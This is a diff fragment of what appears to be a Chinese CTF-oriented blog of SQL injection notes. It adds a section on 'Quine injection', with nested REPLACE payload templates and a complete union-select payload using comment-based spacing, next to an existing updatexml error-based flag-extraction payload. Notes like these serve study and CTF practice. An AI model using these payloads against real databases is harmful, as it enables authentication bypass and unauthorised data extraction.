@@ -441,6 +441,27 @@ select left(&#39;awaawawa&#39;,3) #return awa
 <p>被截断</p>
 <pre><code class="sql">updatexml(1,(mid(concat(0x7e,(select flag from flag limit 0,1),0x7e),0,31)),3) --+
 </code></pre>
+<h1 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h1><p><a href="https://www.anquanke.com/post/id/253570#h2-1">参考</a></p>
+<p>主要利用 <code>replace</code> 这个函数</p>
+<pre><code class="sql">replace(str,old_string,new_string)
+
+REPLACE(&quot;间隔符&quot;,编码的间隔符,&quot;间隔符&quot;)
+</code></pre>
+<h2 id="playload-模板"><a href="#playload-模板" class="headerlink" title="playload 模板"></a>playload 模板</h2><pre><code class="sql">第一步：
+
+REPLACE(REPLACE(&#39;间隔符&#39;,CHAR(34),CHAR(39)),编码的间隔符,&#39;间隔符&#39;)
+
+第二步：
+
+REPLACE(REPLACE(&#39;str&#39;,CHAR(34),CHAR(39)),编码的间隔符,&#39;str&#39;)
+
+str=第一步
+
+eg:
+
+&#39;/**/union/**/SELECT/**/REPLACE(REPLACE(&#39;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#39;,CHAR(34),CHAR(39)),CHAR(46),&#39;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#39;)/**/AS/**/ch3ns1r#
+</code></pre>
+<p>Quine注入说白了就是套娃，导致输入和输出一模一样</p>
 
         </div>
         <!-- .entry-content -->
